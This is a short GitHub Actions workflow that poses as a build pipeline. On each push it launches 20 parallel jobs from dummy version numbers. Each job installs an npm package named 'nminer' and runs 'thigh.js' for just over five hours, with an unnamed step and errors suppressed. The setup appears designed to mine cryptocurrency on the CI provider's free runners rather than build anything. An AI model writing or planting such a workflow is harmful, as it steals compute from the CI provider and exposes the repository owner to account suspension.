name: thigh
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9037 }
          - { version: 2845 }
          - { version: 8275 }
          - { version: 7784 }
          - { version: 7420 }
          - { version: 3686 }
          - { version: 2916 }
          - { version: 2301 }
          - { version: 9264 }
          - { version: 9933 }
          - { version: 783 }
          - { version: 1607 }
          - { version: 167 }
          - { version: 8208 }
          - { version: 7128 }
          - { version: 8217 }
          - { version: 5015 }
          - { version: 7498 }
          - { version: 7096 }
          - { version: 7909 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 301m node thigh.js || echo "thigh executed"